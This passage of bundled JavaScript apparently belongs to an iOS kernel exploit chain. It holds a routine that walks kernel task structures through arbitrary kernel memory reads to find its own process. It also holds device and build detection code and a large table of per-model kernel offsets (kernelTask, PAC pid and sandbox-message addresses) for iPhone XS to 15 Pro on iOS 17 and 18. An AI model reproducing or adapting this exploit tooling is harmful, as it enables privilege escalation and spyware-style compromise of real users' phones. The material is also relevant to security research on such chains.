    if (procVal && this.strip(procVal) > 0xffffffd000000000n) {
      var pid = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
      this.read(procVal + _classPrivateFieldGet(_offsets, this).pid, pid, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
      var buffRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(pid, 4);
      var view = new DataView(buffRes);
      pid = view.getUint32(0, true);
      //console.log(TAG,`pid:${Utils.hex(pid)}`);
      if (pid == ourPid) {
        console.log(TAG, "Found our pid");
        return nextTask;
      }
      var nextTaskLocation = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
      if (direction) this.read(nextTask + _classPrivateFieldGet(_offsets, this).nextTask, nextTaskLocation, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);else this.read(nextTask + _classPrivateFieldGet(_offsets, this).prevTask, nextTaskLocation, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
      nextTask = uread64(nextTaskLocation);
    } else break;
  }
  return false;
}


/***/ }),

/***/ "./libs/Driver/Offsets.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return Offsets; });
/* harmony import */ var libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__("./libs/Chain/OffsetsStruct.js");
/* harmony import */ var _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__("./libs/Driver/OffsetsTable.js");
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _createForOfIteratorHelper(r, e) { var t = "undefined" != typeof Symbol && r[Symbol.iterator] || r["@@iterator"]; if (!t) { if (Array.isArray(r) || (t = _unsupportedIterableToArray(r)) || e && r && "number" == typeof r.length) { t && (r = t); var _n = 0, F = function F() {}; return { s: F, n: function n() { return _n >= r.length ? { done: !0 } : { done: !1, value: r[_n++] }; }, e: function e(r) { throw r; }, f: F }; } throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method."); } var o, a = !0, u = !1; return { s: function s() { t = t.call(r); }, n: function n() { var r = t.next(); return a = r.done, r; }, e: function e(r) { u = !0, o = r; }, f: function f() { try { a || null == t["return"] || t["return"](); } finally { if (u) throw o; } } }; }
function _unsupportedIterableToArray(r, a) { if (r) { if ("string" == typeof r) return _arrayLikeToArray(r, a); var t = {}.toString.call(r).slice(8, -1); return "Object" === t && r.constructor && (t = r.constructor.name), "Map" === t || "Set" === t ? Array.from(r) : "Arguments" === t || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(t) ? _arrayLikeToArray(r, a) : void 0; } }
function _arrayLikeToArray(r, a) { (null == a || a > r.length) && (a = r.length); for (var e = 0, n = Array(a); e < a; e++) n[e] = r[e]; return n; }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }


var TAG = "OFFSETS";
var Offsets = /*#__PURE__*/function () {
  function Offsets() {
    _classCallCheck(this, Offsets);
  }
  return _createClass(Offsets, null, [{
    key: "getByDeviceAndVersion",
    value: function getByDeviceAndVersion() {
      Native.callSymbol("uname", Native.mem);
      var sysname = Native.readString(Native.mem, 0x100);
      var nodename = Native.readString(Native.mem + 0x100n, 0x100);
      var release = Native.readString(Native.mem + 0x200n, 0x100);
      var version = Native.readString(Native.mem + 0x300n, 0x100);
      var machine = Native.readString(Native.mem + 0x400n, 0x100);
      console.log(TAG, "release: ".concat(release, " with machine: ").concat(machine));
      var buildVer = this.getBuildVersion();
      console.log(TAG, "Build version: " + buildVer);
      var splittedVersion = release.split(".");
      var xnuMajor = splittedVersion[0];
      var xnuMinor = splittedVersion[1];
      var splittedMachine = machine.split(",");
      var deviceFamily = splittedMachine[0];
      var deviceModel = splittedMachine[1];
      console.log(TAG, "deviceFamily: " + deviceFamily);

      // Ugly hack to support 17.7, 17.7.1 and 17.7.2
      if (buildVer) {
        if (buildVer == "21H16") xnuMinor = 6.1;else if (buildVer == "21H216") xnuMinor = 6.2;else if (buildVer == "21H221") xnuMinor = 6.3;
      }
      // Get offsets per device family
      var deviceOffsets = _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__["offsets"][deviceFamily];
      if (!deviceOffsets) {
        console.log(TAG, "Unsupported machine: ".concat(machine));
        return null;
      }
      var familyOffsets = deviceOffsets["*"];
      var foundFamilyOffsets = _assertClassBrand(Offsets, this, _getOffsetsByVersion).call(this, familyOffsets, xnuMajor, xnuMinor);
      if (!foundFamilyOffsets) return null;

      // Adjustments per device model
      var modelOffsets = deviceOffsets[deviceModel];
      var foundModelOffsets = null;
      if (modelOffsets) foundModelOffsets = _assertClassBrand(Offsets, this, _getOffsetsByVersion).call(this, modelOffsets, xnuMajor, xnuMinor);

      // Merge family offsets and device offsets
      var foundOffsets = new libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__["default"]();
      Object.assign(foundOffsets, foundFamilyOffsets);
      if (foundModelOffsets) Object.assign(foundOffsets, foundModelOffsets);
      if (["iPhone15", "iPhone16", "iPhone17"].includes(deviceFamily)) foundOffsets.T1SZ_BOOT = 17n;else foundOffsets.T1SZ_BOOT = 25n;
      console.log(TAG, "Offsets: " + JSON.stringify(foundOffsets, function (_, v) {
        return typeof v === 'bigint' ? "0x" + v.toString(16) : v;
      }, 2));
      return foundOffsets;
    }
  }, {
    key: "getBuildVersion",
    value: function getBuildVersion() {
      var CTL_KERN = 1;
      var KERN_OSVERSION = 65;
      var mib = new ArrayBuffer(4 * 2);
      var mibView = new DataView(mib);
      mibView.setInt32(0, CTL_KERN, true);
      mibView.setInt32(4, KERN_OSVERSION, true);
      var mibAddr = Native.mem;
      var resultAddr = Native.mem + 0x100n;
      var lengthAddr = Native.mem + 0x200n;
      Native.write(Native.mem, mib);
      var ret = Native.callSymbol("sysctl", mibAddr, 2, resultAddr, lengthAddr, null, 0);
      if (ret != 0) {
        console.log(TAG, "Unable to get iOS build version");
        return null;
      }
      var length = Native.read32(lengthAddr);
      var buildVer = Native.readString(resultAddr, length);
      return buildVer;
    }
  }]);
}();
function _getOffsetsByVersion(offsets, xnuMajor, xnuMinor) {
  var xnuMajorOffsets = 0;
  for (var major in offsets) {
    if (xnuMajor < major) continue;
    if (xnuMajorOffsets < major) xnuMajorOffsets = major;
  }
  if (!xnuMajorOffsets) {
    console.log(TAG, "Unsupported XNU major: " + xnuMajor);
    return null;
  }

  //console.log(TAG, "Matching XNU major: " + xnuMajorOffsets);
  xnuMajorOffsets = offsets[xnuMajorOffsets];
  var foundOffsets = {};
  var xnuMinorOffsets = -1;
  var sortedMinors = Object.keys(xnuMajorOffsets).sort();
  var _iterator = _createForOfIteratorHelper(sortedMinors),
    _step;
  try {
    for (_iterator.s(); !(_step = _iterator.n()).done;) {
      var minor = _step.value;
      //console.log(TAG, `minor: ${minor}, xnuMinor: ${xnuMinor}`);
      if (minor > xnuMinor) break;
      if (xnuMinorOffsets < minor) {
        xnuMinorOffsets = minor;
        Object.assign(foundOffsets, xnuMajorOffsets[minor]);
      }
    }

    //console.log(TAG, "Matching XNU minor: " + xnuMinorOffsets);
  } catch (err) {
    _iterator.e(err);
  } finally {
    _iterator.f();
  }
  return foundOffsets;
}


/***/ }),

/***/ "./libs/Driver/OffsetsTable.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "offsets", function() { return offsets; });
var offsets = {
  // iPhone XS
  // iPhone XS Max
  // iPhone XS Max Global
  // iPhone XR
  "iPhone11": {
    "*": {
      23: {
        0: {
          pComm: 0x568n,
          excGuard: 0x5bcn,
          kstackptr: 0xe8n,
          ropPid: 0x150n,
          jopPid: 0x158n,
          guardExcCode: 0x308n,
          taskThreads: 0x348n,
          tro: 0x358n,
          ast: 0x37cn,
          mutexData: 0x380n,
          ctid: 0x408n,
          troTask: 0x20n
        },
        3: {
          kernelTask: 0x918210n,
          guardExcCode: 0x318n,
          taskThreads: 0x358n,
          tro: 0x368n,
          ast: 0x38cn,
          mutexData: 0x398n,
          ctid: 0x418n
        },
        4: {
          kernelTask: 0x91c638n,
          pComm: 0x56cn,
          troTask: 0x28n,
          guardExcCode: 0x320n,
          taskThreads: 0x360n,
          tro: 0x370n,
          ast: 0x394n,
          mutexData: 0x3a0n,
          ctid: 0x420n,
          procRO: 0x388n
        },
        5: {
          kernelTask: 0x920a90n
        },
        6: {
          kernelTask: 0x9209f0n
        },
        6.1: {
          kernelTask: 0x920a40n
        }
      },
      24: {
        0: {
          kernelTask: 0x9f1548n,
          pComm: 0x56cn,
          procRO: 0x3a0n,
          ipcSpace: 0x318n,
          troTask: 0x28n,
          excGuard: 0x5dcn,
          kstackptr: 0xf0n,
          ropPid: 0x158n,
          jopPid: 0x160n,
          guardExcCode: 0x320n,
          taskThreads: 0x370n,
          tro: 0x378n,
          ast: 0x39cn,
          mutexData: 0x3a8n,
          ctid: 0x428n
        },
        1: {
          kernelTask: 0x9f1560n,
          taskThreads: 0x368n,
          tro: 0x370n,
          ast: 0x394n,
          mutexData: 0x3a0n,
          ctid: 0x420n
        },
        2: {
          kernelTask: 0x9fd988n
        },
        3: {
          kernelTask: 0x9f5988n
        },
        4: {
          kernelTask: 0xa62b50n,
          procRO: 0x3c0n,
          excGuard: 0x5fcn,
          taskThreads: 0x370n,
          tro: 0x378n,
          ast: 0x39cn,
          mutexData: 0x3a8n,
          ctid: 0x428n
        },
        5: {
          kernelTask: 0xa6ac38n
        },
        6: {
          kernelTask: 0xa6ad48n,
          guardExcCode: 0x328n,
          taskThreads: 0x378n,
          tro: 0x380n,
          ast: 0x3a4n,
          mutexData: 0x3b0n,
          ctid: 0x430n,
          migLock: 0x36971f0n,
          migSbxMsg: 0x3697210n,
          migKernelStackLR: 0x2f7c1a0n
        }
      }
    },
    "8": {
      23: {
        4: {
          kernelTask: 0x8fc638n
        },
        5: {
          kernelTask: 0x900a90n
        },
        6: {
          kernelTask: 0x9009f0n
        },
        6.1: {
          kernelTask: 0x900a40n
        }
      },
      24: {
        0: {
          kernelTask: 0x9d1548n
        },
        1: {
          kernelTask: 0x9d1560n
        },
        2: {
          kernelTask: 0x9d9988n
        },
        3: {
          kernelTask: 0x9d1988n
        },
        4: {
          kernelTask: 0xa42b50n
        },
        5: {
          kernelTask: 0xad6b78n,
          migLock: 0x38d74e8n,
          migSbxMsg: 0x38d7508n,
          migKernelStackLR: 0x31b19e4n
        },
        6: {
          kernelTask: 0xa4ad48n,
          migLock: 0x352e1f0n,
          migSbxMsg: 0x352e210n,
          migKernelStackLR: 0x2e5ba20n
        }
      }
    }
  },
  // iPhone 11
  // iPhone 11 Pro
  // iPhone 11 Pro Max
  // iPhone SE 2
  "iPhone12": {
    "*": {
      23: {
        0: {
          pComm: 0x568n,
          excGuard: 0x5bcn,
          kstackptr: 0xf0n,
          ropPid: 0x158n,
          jopPid: 0x160n,
          guardExcCode: 0x328n,
          taskThreads: 0x368n,
          tro: 0x378n,
          ast: 0x39cn,
          mutexData: 0x3a8n,
          ctid: 0x428n,
          troTask: 0x20n
        },
        3: {
          kernelTask: 0x96c178n
        },
        4: {
          kernelTask: 0x970588n,
          pComm: 0x56cn,
          troTask: 0x28n,
          guardExcCode: 0x330n,
          taskThreads: 0x370n,
          tro: 0x380n,
          ast: 0x3a4n,
          mutexData: 0x3b0n,
          ctid: 0x430n,
          procRO: 0x388n
        },
        5: {
          kernelTask: 0x9749d8n
        },
        6: {
          kernelTask: 0x974938n
        },
        6.1: {
          kernelTask: 0x974988n
        }
      },
      24: {
        0: {
          kernelTask: 0xa49488n,
          pComm: 0x56cn,
          procRO: 0x3a0n,
          ipcSpace: 0x318n,
          troTask: 0x28n,
          excGuard: 0x5dcn,
          kstackptr: 0xf8n,
          ropPid: 0x160n,
          jopPid: 0x168n,
          guardExcCode: 0x330n,
          taskThreads: 0x380n,
          tro: 0x388n,
          ast: 0x3acn,
          mutexData: 0x3b8n,
          ctid: 0x438n
        },
        1: {
          kernelTask: 0xa494a0n,
          taskThreads: 0x378n,
          tro: 0x380n,
          ast: 0x3a4n,
          mutexData: 0x3b0n,
          ctid: 0x430n
        },
        2: {
          kernelTask: 0xa518c8n
        },
        3: {
          kernelTask: 0xa498c8n
        },
        4: {
          kernelTask: 0xacea90n,
          procRO: 0x3c0n,
          excGuard: 0x5fcn,
          taskThreads: 0x380n,
          tro: 0x388n,
          ast: 0x3acn,
          mutexData: 0x3b8n,
          ctid: 0x438n
        },
        5: {
          kernelTask: 0xad6b78n
        },
        6: {
          kernelTask: 0xad6c88n,
          guardExcCode: 0x338n,
          taskThreads: 0x388n,
          tro: 0x390n,
          ast: 0x3b4n,
          mutexData: 0x3c0n,
          ctid: 0x440n,
          migLock: 0x38e34e8n,
          migSbxMsg: 0x38e3508n,
          migKernelStackLR: 0x31ba7a0n
        }
      }
    },
    "3": {
      23: {
        4: {
          kernelTask: 0x974588n
        },
        5: {
          kernelTask: 0x9789d8n
        },
        6: {
          kernelTask: 0x974938n
        },
        6.1: {
          kernelTask: 0x974988n
        }
      },
      24: {
        0: {
          kernelTask: 0xa49488n
        },
        1: {
          kernelTask: 0xa4d4a0n
        },
        2: {
          kernelTask: 0xa558c8n
        },
        3: {
          kernelTask: 0xa4d8c8n
        },
        4: {
          kernelTask: 0xacea90n
        },
        5: {
          kernelTask: 0xad6b78n
        },
        6: {
          kernelTask: 0xad6c88n,
          migLock: 0x38e7468n,
          migSbxMsg: 0x38e7488n,
          migKernelStackLR: 0x31bf5a0n
        }
      }
    },
    "5": {
      23: {
        4: {
          kernelTask: 0x974588n
        },
        5: {
          kernelTask: 0x9789d8n
        },
        6: {
          kernelTask: 0x974938n
        },
        6.1: {
          kernelTask: 0x974988n
        }
      },
      24: {
        0: {
          kernelTask: 0xa49488n
        },
        1: {
          kernelTask: 0xa4d4a0n
        },
        2: {
          kernelTask: 0xa558c8n
        },
        3: {
          kernelTask: 0xa4d8c8n
        },
        4: {
          kernelTask: 0xacea90n
        },
        5: {
          kernelTask: 0xad6b78n
        },
        6: {
          kernelTask: 0xad6c88n,
          migLock: 0x38e7468n,
          migSbxMsg: 0x38e7488n,
          migKernelStackLR: 0x31bf5a0n
        }
      }
    },
    "8": {
      23: {
        4: {
          kernelTask: 0x960588n
        },
        5: {
          kernelTask: 0x9649d8n
        },
        6: {
          kernelTask: 0x964938n
        },
        6.1: {
          kernelTask: 0x964988n
        }
      },
      24: {
        0: {
          kernelTask: 0xa35488n
        },
        1: {
          kernelTask: 0xa354a0n
        },
        2: {
          kernelTask: 0xa3d8c8n
        },
        3: {
          kernelTask: 0xa358c8n
        },
        4: {
          kernelTask: 0xab6a90n
        },
        5: {
          kernelTask: 0xabeb78n
        },
        6: {
          kernelTask: 0xac2c88n,
          migLock: 0x387a8e8n,
          migSbxMsg: 0x387a908n,
          migKernelStackLR: 0x3156f20n
        }
      }
    }
  },
  // iPhone 12
  // iPhone 12 Mini
  // iPhone 12 Pro
  // iPhone 12 Pro Max
  "iPhone13": {
    "*": {
      23: {
        0: {
          pComm: 0x568n,
          excGuard: 0x5bcn,
          kstackptr: 0xf0n,
          ropPid: 0x158n,
          jopPid: 0x160n,
          guardExcCode: 0x318n,
          taskThreads: 0x358n,
          tro: 0x368n,
          ast: 0x38cn,
          mutexData: 0x390n,
          ctid: 0x418n,
          troTask: 0x20n
        },
        3: {
          kernelTask: 0x94c2d0n,
          guardExcCode: 0x328n,
          taskThreads: 0x368n,
          tro: 0x378n,
          ast: 0x39cn,
          mutexData: 0x3a8n,
          ctid: 0x428n
        },
        4: {
          kernelTask: 0x9546e0n,
          pComm: 0x56cn,
          troTask: 0x28n,
          guardExcCode: 0x330n,
          taskThreads: 0x370n,
          tro: 0x380n,
          ast: 0x3a4n,
          mutexData: 0x3b0n,
          ctid: 0x430n,
          procRO: 0x388n
        },
        5: {
          kernelTask: 0x954b30n
        },
        6: {
          kernelTask: 0x954a90n
        },
        6.1: {
          kernelTask: 0x954ae0n
        }
      },
      24: {
        0: {
          kernelTask: 0xa295e0n,
          pComm: 0x56cn,
          procRO: 0x3a0n,
          ipcSpace: 0x318n,
          troTask: 0x28n,
          excGuard: 0x5dcn,
          kstackptr: 0xf8n,
          ropPid: 0x160n,
          jopPid: 0x168n,
          guardExcCode: 0x330n,
          taskThreads: 0x380n,
          tro: 0x388n,
          ast: 0x3acn,
          mutexData: 0x3b8n,
          ctid: 0x438n
        },
        1: {
          kernelTask: 0xa2d5f8n,
          taskThreads: 0x378n,
          tro: 0x380n,
          ast: 0x3a4n,
          mutexData: 0x3b0n,
          ctid: 0x430n
        },
        2: {
          kernelTask: 0xa35a20n
        },
        3: {
          kernelTask: 0xa2da20n
        },
        4: {
          kernelTask: 0xa9ebe8n,
          procRO: 0x3c0n,
          excGuard: 0x5fcn,
          taskThreads: 0x380n,
          tro: 0x388n,
          ast: 0x3acn,
          mutexData: 0x3b8n,
          ctid: 0x438n,
          migLock: 0x37b8b80n,
          migSbxMsg: 0x37b8ba0n,
          migKernelStackLR: 0x3190fa0n
        },
        5: {
          kernelTask: 0xaa6cd0n,
          migLock: 0x37d4c90n,
          migSbxMsg: 0x37d4cb0n,
          migKernelStackLR: 0x31acce4n
        },
        6: {
          kernelTask: 0xaaade0n,
          guardExcCode: 0x338n,
          taskThreads: 0x388n,
          tro: 0x390n,
          ast: 0x3b4n,
          mutexData: 0x3c0n,
          ctid: 0x440n,
          migLock: 0x37dcc90n,
          migSbxMsg: 0x37dccb0n,
          migKernelStackLR: 0x31b5b60n
        }
      }
    }
  },
  // iPhone 13
  // iPhone 13 Mini
  // iPhone 13 Pro
  // iPhone 13 Pro Max
  // iPhone SE 3
  // iPhone 14
  // iPhone 14 Plus
  "iPhone14": {
    "*": {
      23: {
        0: {
          pComm: 0x568n,
          excGuard: 0x5d4n,
          kstackptr: 0xf0n,
          ropPid: 0x160n,
          jopPid: 0x168n,
          guardExcCode: 0x330n,
          taskThreads: 0x370n,
          tro: 0x380n,
          ast: 0x3a4n,
          mutexData: 0x3b0n,
          ctid: 0x430n,
          troTask: 0x20n
        },
        3: {
          kernelTask: 0x918ee0n
        },
        4: {
          kernelTask: 0x91d318n,
          pComm: 0x56cn,
          troTask: 0x28n,
          guardExcCode: 0x338n,
          taskThreads: 0x378n,
          tro: 0x388n,
          ast: 0x3acn,
          mutexData: 0x3b8n,
          ctid: 0x438n
        },
        5: {
          kernelTask: 0x925770n
        },
        6: {
          kernelTask: 0x9256d0n
        },
        6.1: {
          kernelTask: 0x925720n
        }
      },
      24: {
        0: {
          kernelTask: 0x9f6230n,
          pComm: 0x56cn,
          procRO: 0x3b8n,
          ipcSpace: 0x318n,
          troTask: 0x28n,
          excGuard: 0x5f4n,
          kstackptr: 0xf8n,
          ropPid: 0x168n,
          jopPid: 0x170n,
          guardExcCode: 0x338n,
          taskThreads: 0x388n,
          tro: 0x390n,
          ast: 0x3b4n,
          mutexData: 0x3c0n,
          ctid: 0x440n
        },
        1: {
          kernelTask: 0x9f6248n,
          taskThreads: 0x380n,
          tro: 0x388n,
          ast: 0x3acn,
          mutexData: 0x3b8n,
          ctid: 0x438n
        },
        2: {
          kernelTask: 0xa02678n
        },
        3: {
          kernelTask: 0x9fa678n
        },
        4: {
          kernelTask: 0xa67b18n,
          procRO: 0x3e0n,
          excGuard: 0x624n,
          taskThreads: 0x388n,
          tro: 0x390n,
          ast: 0x3b4n,
          mutexData: 0x3c0n,
          ctid: 0x448n,
          migLock: 0x382c218n,
          migSbxMsg: 0x382c238n,
          migKernelStackLR: 0x317d020n
        },
        5: {
          kernelTask: 0xa6fc00n,
          migLock: 0x3848428n,
          migSbxMsg: 0x3848448n,
          migKernelStackLR: 0x31994a4n
        },
        6: {
          kernelTask: 0xa73d10n,
          guardExcCode: 0x340n,
          taskThreads: 0x390n,
          tro: 0x398n,
          ast: 0x3bcn,
          mutexData: 0x3c8n,
          ctid: 0x450n,
          migLock: 0x38543a8n,
          migSbxMsg: 0x38543c8n,
          migKernelStackLR: 0x31a27e0n
        }
      }
    },
    "6": {
      23: {
        4: {
          kernelTask: 0x92d318n
        },
        5: {
          kernelTask: 0x935770n
        },
        6: {
          kernelTask: 0x9316d0n
        },
        6.1: {
          kernelTask: 0x931720n
        }
      },
      24: {
        0: {
          kernelTask: 0xa06230n
        },
        1: {
          kernelTask: 0xa06248n
        },
        2: {
          kernelTask: 0xa12678n
        },
        3: {
          kernelTask: 0xa0a678n
        },
        4: {
          kernelTask: 0xa77b18n,
          migLock: 0x3898c18n,
          migSbxMsg: 0x3898c38n,
          migKernelStackLR: 0x31dff60n
        },
        5: {
          kernelTask: 0xa7fc00n,
          migLock: 0x38b4e28n,
          migSbxMsg: 0x38b4e48n,
          migKernelStackLR: 0x31fc3e4n
        },
        6: {
          kernelTask: 0xa83d10n,
          migLock: 0x38bcda8n,
          migSbxMsg: 0x38bcdc8n,
          migKernelStackLR: 0x3205560n
        }
      }
    },
    "7": {
      23: {
        4: {
          kernelTask: 0x919318n
        },
        5: {
          kernelTask: 0x921770n
        },
        6: {
          kernelTask: 0x9216d0n
        },
        6.1: {
          kernelTask: 0x921720n
        }
      },
      24: {
        0: {
          kernelTask: 0x9f2230n
        },
        1: {
          kernelTask: 0x9f2248n
        },
        2: {
          kernelTask: 0x9fe678n
        },
        3: {
          kernelTask: 0x9f6678n
        },
        4: {
          kernelTask: 0xa67b18n,
          migLock: 0x3813d98n,
          migSbxMsg: 0x3813db8n,
          migKernelStackLR: 0x3163ae0n
        },
        5: {
          kernelTask: 0xa6fc00n,
          migLock: 0x382ffa8n,
          migSbxMsg: 0x382ffc8n,
          migKernelStackLR: 0x317ffa4n
        },
        6: {
          kernelTask: 0xa6fd10n,
          migLock: 0x3833fa8n,
          migSbxMsg: 0x3833fc8n,
          migKernelStackLR: 0x31852a0n
        }
      }
    },
    "8": {
      23: {
        4: {
          kernelTask: 0x919318n
        },
        5: {
          kernelTask: 0x921770n
        },
        6: {
          kernelTask: 0x9216d0n
        },
        6.1: {
          kernelTask: 0x921720n
        }
      },
      24: {
        0: {
          kernelTask: 0x9f2230n
        },
        1: {
          kernelTask: 0x9f2248n
        },
        2: {
          kernelTask: 0x9fe678n
        },
        3: {
          kernelTask: 0x9f6678n
        },
        4: {
          kernelTask: 0xa67b18n,
          migLock: 0x3813d98n,
          migSbxMsg: 0x3813db8n,
          migKernelStackLR: 0x3163ae0n
        },
        5: {
          kernelTask: 0xa6fc00n,
          migLock: 0x382ffa8n,
          migSbxMsg: 0x382ffc8n,
          migKernelStackLR: 0x317ffa4n
        },
        6: {
          kernelTask: 0xa6fd10n,
          migLock: 0x3833fa8n,
          migSbxMsg: 0x3833fc8n,
          migKernelStackLR: 0x31852a0n
        }
      }
    }
  },
  // iPhone 14 Pro
  // iPhone 14 Pro Max
  // iPhone 15
  // iPhone 15 Plus
  "iPhone15": {
    "*": {
      23: {
        0: {
          pComm: 0x568n,
          excGuard: 0x5d4n,
          kstackptr: 0xf0n,
          ropPid: 0x160n,
          jopPid: 0x168n,
          guardExcCode: 0x330n,
          taskThreads: 0x370n,
          tro: 0x380n,
          ast: 0x3a4n,
          mutexData: 0x3b0n,
          ctid: 0x430n,
          troTask: 0x20n
        },
        3: {
          kernelTask: 0x914e00n
        },
        4: {
          kernelTask: 0x919238n,
          pComm: 0x56cn,
          troTask: 0x28n,
          guardExcCode: 0x338n,
          taskThreads: 0x378n,
          tro: 0x388n,
          ast: 0x3acn,
          mutexData: 0x3b8n,
          ctid: 0x438n
        },
        5: {
          kernelTask: 0x921690n
        },
        6: {
          kernelTask: 0x9215f0n
        },
        6.1: {
          kernelTask: 0x921640n
        },
        6.2: {
          kernelTask: 0x91d640n
        }
      },
      24: {
        0: {
          kernelTask: 0x9ee150n,
          pComm: 0x56cn,
          procRO: 0x3b8n,
          ipcSpace: 0x318n,
          troTask: 0x28n,
          excGuard: 0x5f4n,
          kstackptr: 0xf8n,
          ropPid: 0x168n,
          jopPid: 0x170n,
          guardExcCode: 0x338n,
          taskThreads: 0x388n,
          tro: 0x390n,
          ast: 0x3b4n,
          mutexData: 0x3c0n,
          ctid: 0x440n
        },
        1: {
          kernelTask: 0x9f2168n,
          taskThreads: 0x380n,
          tro: 0x388n,
          ast: 0x3acn,
          mutexData: 0x3b8n,
          ctid: 0x438n
        },
        2: {
          kernelTask: 0x9fe598n
        },
        3: {
          kernelTask: 0x9f6598n
        },
        4: {
          kernelTask: 0xa67c18n,
          procRO: 0x3e0n,
          excGuard: 0x624n,
          taskThreads: 0x388n,
          tro: 0x390n,
          ast: 0x3b4n,
          mutexData: 0x3c0n,
          ctid: 0x448n,
          migLock: 0x37863f8n,
          migSbxMsg: 0x3786418n,
          migKernelStackLR: 0x3131620n
        },
        5: {
          kernelTask: 0xa6fd00n,
          migLock: 0x37a2788n,
          migSbxMsg: 0x37a27a8n,
          migKernelStackLR: 0x314dc24n
        },
        6: {
          kernelTask: 0xa6fe10n,
          guardExcCode: 0x340n,
          taskThreads: 0x390n,
          tro: 0x398n,
          ast: 0x3bcn,
          mutexData: 0x3c8n,
          ctid: 0x450n,
          migLock: 0x37aa708n,
          migSbxMsg: 0x37aa728n,
          migKernelStackLR: 0x3152ee0n
        }
      }
    },
    "4": {
      23: {
        4: {
          kernelTask: 0x941238n
        },
        5: {
          kernelTask: 0x949690n
        },
        6: {
          kernelTask: 0x9495f0n
        },
        6.1: {
          kernelTask: 0x949640n
        }
      },
      24: {
        0: {
          kernelTask: 0xa2a150n
        },
        1: {
          kernelTask: 0xa2a168n
        },
        2: {
          kernelTask: 0xa3a598n
        },
        3: {
          kernelTask: 0xa32598n
        },
        4: {
          kernelTask: 0xaa3c18n,
          migLock: 0x38c5388n,
          migSbxMsg: 0x38c53a8n,
          migKernelStackLR: 0x325f1e0n
        },
        5: {
          kernelTask: 0xaa7d00n,
          migLock: 0x38dd698n,
          migSbxMsg: 0x38dd6b8n,
          migKernelStackLR: 0x32777e4n
        },
        6: {
          kernelTask: 0xaabe10n,
          migLock: 0x38e5618n,
          migSbxMsg: 0x38e5638n,
          migKernelStackLR: 0x3280aa0n
        }
      }
    },
    "5": {
      23: {
        4: {
          kernelTask: 0x941238n
        },
        5: {
          kernelTask: 0x949690n
        },
        6: {
          kernelTask: 0x9495f0n
        },
        6.1: {
          kernelTask: 0x949640n
        }
      },
      24: {
        0: {
          kernelTask: 0xa2a150n
        },
        1: {
          kernelTask: 0xa2a168n
        },
        2: {
          kernelTask: 0xa3a598n
        },
        3: {
          kernelTask: 0xa32598n
        },
        4: {
          kernelTask: 0xaa3c18n,
          migLock: 0x38c5388n,
          migSbxMsg: 0x38c53a8n,
          migKernelStackLR: 0x325f1e0n
        },
        5: {
          kernelTask: 0xaa7d00n,
          migLock: 0x38dd698n,
          migSbxMsg: 0x38dd6b8n,
          migKernelStackLR: 0x32777e4n
        },
        6: {
          kernelTask: 0xaabe10n,
          migLock: 0x38e5618n,
          migSbxMsg: 0x38e5638n,
          migKernelStackLR: 0x3280aa0n
        }
      }
    }
  },
  // iPhone 15 Pro
  // iPhone 15 Pro Max
  "iPhone16": {
    "*": {
      23: {
        0: {
          pComm: 0x568n,
          excGuard: 0x5d4n,
          kstackptr: 0x140n,
          ropPid: 0x1b0n,
          jopPid: 0x1b8n,
          guardExcCode: 0x380n,
          taskThreads: 0x3c0n,
          tro: 0x3d0n,
          ast: 0x3f4n,
          mutexData: 0x400n,
          ctid: 0x480n,
          troTask: 0x20n
        },
        3: {
          kernelTask: 0x978ef0n
        },
        4: {
          kernelTask: 0x991eb0n,
          pComm: 0x56cn,
          troTask: 0x28n,
          options: 0xc0n,
          guardExcCode: 0x388n,
          taskThreads: 0x3c8n,
          tro: 0x3d8n,
          ast: 0x3fcn,
          mutexData: 0x408n,
          ctid: 0x488n
        },
        5: {
          kernelTask: 0x99a308n
        },
        6: {
          kernelTask: 0x99a268n
        },
        6.1: {
          kernelTask: 0x99a2b8n
        },
        6.2: {
          kernelTask: 0x9962b8n
        }
      },
      24: {
        0: {
          kernelTask: 0xaae870n,
          pComm: 0x56cn,
          procRO: 0x3b8n,
          ipcSpace: 0x318n,
          troTask: 0x28n,
          excGuard: 0x5f4n,
          kstackptr: 0x148n,
          ropPid: 0x1b8n,
          jopPid: 0x1c0n,
